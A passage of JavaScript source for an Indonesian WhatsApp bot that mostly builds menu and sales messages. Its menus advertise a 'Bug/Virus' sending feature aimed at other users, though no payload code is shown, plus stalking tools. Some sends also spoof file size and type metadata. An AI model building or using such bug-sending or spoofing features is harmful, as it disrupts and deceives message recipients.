						"buttonParamsJson": `{\"display_text\":\"Newsletter 📣\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
					}
				]
				let teks = `*</> BOT SCRIPT QIOO V9</>*

*🛍️Price :* 35k Free Update

*Special Features And Benefits*
- Downloader
- Stalker
- Mini Games
- Role & Ranked
- Case Type
- Work All
- Mudah Diedit
- No encript
- 1300+ cases
- Jadibot
- List Store Button
- Fullbutton All
- BUG Feature
- Panel Create
- Always Free Update
- And Other ✨

*Terms Of Use Script*
- NodeJS V16
- Imagemagick
- FFmpeg
- Ram Min. 1GB
- Kesadaran (niat)
`
				await vreden.sendButtonImage(m.chat, {
					url: "https://pomf2.lain.la/f/4cabvir8.jpg"
				}, button, teks, footer, m)
			}
			break
			case 'sewabot':
			case 'daftarprem':
			case 'buyprem':
			case 'sewa': {
				let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Chat Owner💫\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
					},
					{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Newsletter 📣\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
					}
				]
				let teks = `*</> SEWA & VVIP REGISTER </>*

*🛍️Sewa Bot Ke Group*
- Weekly : 7k
- Monthly : 12k
- Permanent : 25k

*💳 VVIP Membership*
- Weekly : 7k
- Monthly : 10k
- Permanent : 20k

`
				await vreden.sendButtonImage(m.chat, {
					url: "https://pomf2.lain.la/f/j9ouow1b.jpg"
				}, button, teks, footer, m)
			}
			break
			case 'waktu':
			case 'time':
			case 'cekwaktu': {
				let baru = hitungmundur(1, 1, 2025)
				let ramadhan = hitungmundur(12, 4, 2024)
				let natal = hitungmundur(25, 12, 2024)
				await vreden.sendMessage(m.chat, {
					text: `*WAKTU INFO*\n\n\n*Jam* : ${time}\n\n*Lebaran* :\nJangan Lupa THR nya kak >.<\n\n*Tahun Baru* :\n${baru}\n\n*Natal* :\n${natal}\n\n\n_Manfaatkan Lah Waktu Sempatmu, Sebelum Datang Waktu Sempitmu, Karena Momen Berharga Tak Mungkin Dapat Terulang Kembali_ >_<`,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'allmenu': {
				let allmenu = `*_Silahkan Dilihat Alfiturnya..._*


▢━━「 *MAIN* 」━━▢

${cmdMain.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *FITUR GRUP* 」━━▢

${cmdGrup.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *DOWNLOADER* 」━━▢

${cmdDown.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *SEARCHING* 」━━▢

${cmdSearch.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *CONVERTER* 」━━▢

${cmdConvert.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *FITUR GAME* 」━━▢

${cmdGame.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *OPEN AI* 」━━▢

${cmdAi.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *RPG GAME* 」━━▢

${cmdRPG.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *EPHOTO 360* 」━━▢

${cmdEph.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *FUN (GABUT)* 」━━▢

${cmdFun.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *OWNER* 」━━▢

${cmdOwn.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *ISLAMI* 」━━▢

${cmdIslam.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *STORAGE* 」━━▢

${cmdStorage.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *ASUPAN* 」━━▢

${cmdAsupan.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *CEWEK ASIA* 」━━▢

${cmdCwe.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *QUOTES* 」━━▢

${cmdQuo.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *RANDOM* 」━━▢

${cmdRdm.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *STALKER* 」━━▢

${cmdStalk.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *STICKER* 」━━▢

${cmdStiker.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *STORE* 」━━▢

${cmdStore.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *ANONYMOUS* 」━━▢

${cmdAnom.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *NSFW (18+)* 」━━▢

${cmdNsfw.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *BALANCE* 」━━▢

${cmdBal.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *COWO GANTENG* 」━━▢

${cmdCwo.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *BUG FITUR* 」━━▢

*LOW MODE*
${cmdBug.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

*HARD MODE*
${cmdBugHard.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *PTERODACTLY* 」━━▢

${cmdPanel.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

▢━━「 *SIMPLE MENU* 」━━▢

${cmdSim.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}
`
				let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
					},
					{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Script\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Assalamualaikum, bang SC nya berapa\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Assalamualaikum, bang SC nya berapa\"}`
					},
					{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Information\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
					}
				]
				vreden.sendButtonDocument(m.chat, {
					document: fs.readFileSync('./media/thumbnail2.jpg'),
					mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
					fileLength: 10000000000,
					pageCount: 77,
					jpegThumbnail: fs.readFileSync("./media/thumbnail2.jpg"),
					fileName: `${namasaluran}`,
				}, button, allmenu, footer, m, {
					contextInfo: {
						mentionedJid: ments(allmenu),
						externalAdReply: {
							showAdAttribution: true,
							containsAutoReply: true,
							title: ucapanWaktu,
							body: "Selamat Beraktifitas ~~",
							thumbnailUrl: pathimg,
							sourceUrl: '',
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				})
			}
			break
			case 'tester': {
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')

				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: "test"
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: footxt
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: "test",
									subtitle: "test",
									hasMediaAttachment: false
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
											"name": "single_select",
											"buttonParamsJson": "{\"title\":\"MENU\",\"sections\":[{\"title\":\"MENU BOT QIOO OFFICIAL\",\"highlight_label\":\"Qioo Official\",\"rows\":[{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\".play\"},{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\".play\"}]}]}"
										},
										{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"quick_reply\",\"id\":\".mute on\"}`
										},
										{
											"name": "cta_url",
											"buttonParamsJson": `{\"display_text\":\"url\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}`
										},
										{
											"name": "cta_call",
											"buttonParamsJson": `{\"display_text\":\"call\",\"id\":\"message\"}`
										},
										{
											"name": "cta_copy",
											"buttonParamsJson": `{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"message\"}`
										},
										{
											"name": "cta_reminder",
											"buttonParamsJson": `{\"display_text\":\"cta_reminder\",\"id\":\"message\"}`
										},
										{
											"name": "cta_cancel_reminder",
											"buttonParamsJson": `{\"display_text\":\"cta_cancel_reminder\",\"id\":\"message\"}`
										},
										{
											"name": "address_message",
											"buttonParamsJson": `{\"display_text\":\"address_message\",\"id\":\"message\"}`
										},
										{
											"name": "send_location",
											"buttonParamsJson": ""
										}, {
											"name": "multi_select",
											"buttonParamsJson": "{\n  \"title\": \"Select Options\",\n  \"sections\": [\n    {\n      \"title\": \"Options\",\n      \"highlight_label\": \"Highlight\",\n      \"rows\": [\n        {\n          \"header\": \"Header\",\n          \"title\": \"Option 1\",\n          \"description\": \"Description\",\n          \"id\": \"option_1\"\n        },\n        {\n          \"header\": \"Header\",\n          \"title\": \"Option 2\",\n          \"description\": \"Description\",\n          \"id\": \"option_2\"\n        }\n      ]\n    }\n  ]\n}"
										}, {
											"name": "product_list",
											"buttonParamsJson": "{\n  \"title\": \"Product List\",\n  \"sections\": [\n    {\n      \"title\": \"Products\",\n      \"highlight_label\": \"Products\",\n      \"rows\": [\n        {\n          \"header\": \"Header\",\n          \"title\": \"Product 1\",\n          \"description\": \"Description\",\n          \"id\": \"product_1\"\n        }\n      ]\n    }\n  ]\n}"
										}, {
											"name": "carousel",
											"buttonParamsJson": "{\n  \"elements\": [\n    {\n      \"title\": \"Title 1\",\n      \"description\": \"Description 1\",\n      \"image_url\": \"https://example.com/image1.jpg\",\n      \"button\": {\n        \"type\": \"cta_url\",\n        \"url\": \"https://example.com\"\n      }\n    },\n    {\n      \"title\": \"Title 2\",\n      \"description\": \"Description 2\",\n      \"image_url\": \"https://example.com/image2.jpg\",\n      \"button\": {\n        \"type\": \"cta_url\",\n        \"url\": \"https://example.com\"\n      }\n    }\n  ]\n}"
										}, {
											"name": "list_select",
											"buttonParamsJson": "{\n  \"title\": \"Choose an option\",\n  \"sections\": [\n    {\n      \"title\": \"Options\",\n      \"rows\": [\n        {\n          \"title\": \"Option 1\",\n          \"id\": \"option_1\"\n        },\n        {\n          \"title\": \"Option 2\",\n          \"id\": \"option_2\"\n        }\n      ]\n    }\n  ]\n}"
										}
									],
								})
							})
						}
					}
				}, {})

				await vreden.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				})
			}
			break
			case 'totalfeature':
			case 'totalfiture':
			case 'totalfitur': {
				if (m.isGroup) return m.warning('Fitur Khusus Di private chat!')
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')

				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: `\n- *Total Fitur:* ${totalFitur()}\n- *Total Error:* 4\n- *Fitur Online:* ${totalFitur() - 4}\n`
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: footxt
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: "乂 FITUR - INFO",
									subtitle: "Yahya Ali Almuthahar",
									hasMediaAttachment: false
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "review_and_pay",
										"buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'Total All Fitur',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalFitur()}\n  }\n]\n  },\n  additional_note: ''\n}`
									}],
								})
							})
						}
					}
				}, {
					quoted: fchannel
				})

				await vreden.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				})
			}
			break
			case 'menu':
			case 'help': {
				let simplemenu = home.replace("@botname", `${botName}`).replace("@prefix", `${prefix}`).replace("@jam", `${time}`).replace("@totalfitur", `${totalFitur()}`).replace("@device", `${isCreator ? "web" : getDevice(mek.key.id)}`).replace("@ucapan", `${ucapanWaktu}`).replace("@nomor", `${usernomor}`).replace("@pushname", `${pushname}`)
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
  "title": "MENU",
  "sections": [
    {
      "title": "Eksplorasi Semua Menu Qioo Official 🔥",
      "highlight_label": "Qioo Official",
      "rows": [
        {
          "header": "All Menu 🔥",
          "title": "Lihat Semua Menu 🔥",
          "id": ".allmenu"
        },
        {
          "header": "Simple Menu 📦",
          "title": "Lihat Sub Kategori Menu 📦",
          "id": ".simplemenu"
        },
        {
          "header": "Owner Menu 👑",
          "title": "Lihat Fitur Khusus Owner 👑",
          "id": ".ownermenu"
        },
        {
          "header": "Group Menu 👥",
          "title": "Fitur Khusus untuk Grup 👥",
          "id": ".groupmenu"
        },
        {
          "header": "Panel Menu 🦖",
          "title": "Kelola Panel Pterodactyl 🦖",
          "id": ".panelmenu"
        },
        {
          "header": "Fun Menu 🎉",
          "title": "Penghilang Kegabutan 🎉",
          "id": ".funmenu"
        },
        {
          "header": "Download Menu 📥",
          "title": "Fitur Download Praktis 📥",
          "id": ".downloadmenu"
        },
        {
          "header": "Convert Menu 🔃",
          "title": "Alat Konversi Serbaguna 🔃",
          "id": ".convertmenu"
        },
        {
          "header": "Game Menu 🎮",
          "title": "Mainkan Beragam Game 🎮",
          "id": ".gamemenu"
        },
        {
          "header": "Balance Menu 💸",
          "title": "Cek Saldo dan Transaksi 💸",
          "id": ".balancemenu"
        },
        {
          "header": "Main Menu 🕹️",
          "title": "Akses Menu Utama 🕹️",
          "id": ".mainmenu"
        },
        {
          "header": "Random Sticker 🖼️",
          "title": "Koleksi Stiker Acak 🖼️",
          "id": ".randomsticker"
        },
        {
          "header": "Islam Menu ☪️",
          "title": "Fitur Islami untuk Keseharian ☪️",
          "id": ".islammenu"
        },
        {
          "header": "RPG Menu ⚔️",
          "title": "Bertualang di Dunia RPG ⚔️",
          "id": ".rpgmenu"
        },
        {
          "header": "Store Menu 🏪",
          "title": "Kunjungi Toko Virtual 🏪",
          "id": ".storemenu"
        },
        {
          "header": "Anonymous Menu 👤",
          "title": "Fitur Anonim untuk Privasi 👤",
          "id": ".anonymousmenu"
        },
        {
          "header": "Cewek Asia Menu 💁‍♀️",
          "title": "Galeri Cewek Asia 💁‍♀️",
          "id": ".cewekasiamenu"
        },
        {
          "header": "Random Quotes 📝",
          "title": "Dapatkan Quotes Acak 📝",
          "id": ".randomquotes"
        },
        {
          "header": "Random Menu 🎲",
          "title": "Lihat Menu Acak 🎲",
          "id": ".randommenu"
        },
        {
          "header": "Search Menu 🔍",
          "title": "Cari Beragam Informasi 🔍",
          "id": ".searchmenu"
        },
        {
          "header": "Asupan Menu 🍹",
          "title": "Koleksi Video Asupan 🍹",
          "id": ".asupanmenu"
        },
        {
          "header": "Storage Menu 📦",
          "title": "Kelola Penyimpanan 📦",
          "id": ".storagemenu"
        },
        {
          "header": "Cowok Asia Menu 💁‍♂️",
          "title": "Galeri Cowok Asia 💁‍♂️",
          "id": ".cowokasiamenu"
        },
        {
          "header": "Bug Menu 🐛",
          "title": "Kirim Sebuah Bug/Virus 🐛",
          "id": ".bugmenu"
        },
        {
          "header": "Stalking Menu 👀",
          "title": "Lacak Aktivitas 👀",
          "id": ".stalkingmenu"
        },
        {
          "header": "Ephoto Menu 🖼️",
          "title": "Buat Gambar Keren 🖼️",
          "id": ".ephotomenu"
        },
        {
          "header": "NSFW Menu 🔞",
          "title": "Konten Anime Dewasa 🔞",
          "id": ".nsfwmenu"
        },
        {
          "header": "Script Bot 🦚",
          "title": "Akses Script Bot 🦚",
          "id": ".script"
        }
      ]
    }
  ]
}`
				}, {
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"All Menu\",\"id\":\".allmenu\"}`
				}, {
					"name": "quick_reply",
					"buttonParamsJson": `{\"display_text\":\"Speedtest\",\"id\":\".ping\"}`
				}, {
					"name": "cta_url",
					"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://wa.me/message/GUDWAL3TZRN2I1\",\"merchant_url\":\"https://wa.me/message/GUDWAL3TZRN2I1\"}`
				}]
				if (menu === "v1") {
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail.jpg'),
						mimetype: "image/png",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: fs.readFileSync("./media/thumbnail.jpg"),
						fileName: `${namasaluran}`,
					}, button, simplemenu, footer, m, {
						contextInfo: {
							mentionedJid: ments(simplemenu),
							externalAdReply: {
								showAdAttribution: true,
								containsAutoReply: true,
								title: ucapanWaktu,
								body: "Selamat Beraktifitas ~~",
								thumbnailUrl: pathimg,
								sourceUrl: '',
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					})
				} else if (menu === "v2") {
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail2.jpg'),
						mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: fs.readFileSync("./media/thumbnail2.jpg"),
						fileName: `${namasaluran}`,
					}, button, simplemenu, footer, m, {
						contextInfo: {
							mentionedJid: ments(simplemenu),
							externalAdReply: {
								showAdAttribution: true,
								containsAutoReply: true,
								title: ucapanWaktu,
								body: "Selamat Beraktifitas ~~",
								thumbnailUrl: pathimg,
								sourceUrl: '',
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					})
				} else if (menu === "v3") {
					newReply(simplemenu, {
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: botName,
								body: 'Chat Pintar di WhatsApp.',
								thumbnailUrl: pathimg,
								sourceUrl: gcwa,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					});
				} else if (menu === "v4") {
					await vreden.sendButtonImage(m.chat, {
						url: pathimg
					}, button, simplemenu, footer, m)
				} else if (menu === "v5") {
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail2.jpg'),
						mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: fs.readFileSync("./media/thumbnail2.jpg"),
						fileName: `${namasaluran}`,
					}, button, simplemenu, footer, m)
				} else if (menu === "v6") {
					vreden.sendButtonText(m.chat, button, simplemenu, footer, m)
				} else {
					m.reply("menu belum di set")
				}
			}
			break
			case 'simplemenu': {
				let simplee = `▢━━「 *SIMPLE MENU* 」━━▢

${cmdSim.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(simplee, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'mainmenu': {
				let mainmenu = `▢━━「 *MAIN* 」━━▢

${cmdMain.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(mainmenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'rpgmenu': {
				let rpgmenu = `▢━━「 *RPG GAME* 」━━▢

${cmdRPG.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(rpgmenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'panelmenu': {
				let panelmenu = `▢━━「 *PTERODACTLY* 」━━▢

${cmdPanel.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(panelmenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'convertmenu': {
				let convertMenu = `▢━━「 *CONVERTER* 」━━▢

${cmdConvert.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(convertMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'anonymousmenu': {
				let anonymousMenu = `▢━━「 *ANONYMOUS* 」━━▢

${cmdAnom.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(anonymousMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'storemenu': {
				let storeMenu = `▢━━「 *STORE* 」━━▢

${cmdStore.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(storeMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'gamemenu': {
				let gameMenu = `▢━━「 *FITUR GAME* 」━━▢

${cmdGame.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(gameMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'groupmenu': {
				let groupMenu = `▢━━「 *FITUR GRUP* 」━━▢

${cmdGrup.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(groupMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'downloadmenu': {
				let downloadMenu = `▢━━「 *DOWNLOADER* 」━━▢

${cmdDown.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(downloadMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'searchmenu': {
				let searchMenu = `▢━━「 *SEARCHING* 」━━▢

${cmdSearch.sort((a, b) => a.localeCompare(b)).map((v, i) => `[ ⌬ ] ${prefix + v}`).join('\n')}

> ${footxt}`
				newReply(searchMenu, {
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "WHATSAPP - BOT",
							body: 'Chat Pintar di WhatsApp.',
							thumbnailUrl: pathimg,
							sourceUrl: gcwa,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: fchannel
				})
			}
			break
			case 'randommenu': {
				let randomMenu = `▢━━「 *RANDOM* 」━━▢

